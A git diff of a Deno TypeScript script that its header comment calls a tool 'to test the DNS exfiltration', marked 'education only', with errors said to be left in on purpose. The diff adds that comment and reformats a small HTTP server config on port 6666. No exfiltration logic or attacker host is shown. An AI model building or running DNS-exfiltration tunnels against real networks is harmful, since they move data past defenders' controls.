@@ -1,10 +1,22 @@
+/*
+This script can be used to test the DNS exfiltration.
+It will send a request to the server and return the response.
 
+- very slow
+- no SSL
+- no authentication
+- no cache
+
+EDUCATION ONLY - DO NOT USE IN PRODUCTION
+
+we will not responsible of your bullshit
+
+this code contain errors to force you to understand how it's work and patch him befor use it
+*/
 import { serve, Response } from "https://deno.land/std@0.106.0/http/server.ts";
 
 // Les settings du serveur
-const config =  {
-    port: 6666
-}
+const config =  { port: 6666 }
 const server = serve({ port: config.port });
 
 console.log(`Client started on port ${config.port}`);
@@ -22,6 +34,7 @@ async function main(request:any) {
     } else if(request.url.startsWith("https://")){
         pre = "b"
     }
+
     request.url = request.url.replace("http://", "").replace("https://", "")
     
     try{
@@ -46,6 +59,7 @@ async function main(request:any) {
     try{
         request.respond(response);
     } catch(err){}
+    
 }
 
 async function makeTheRequest(token, count){
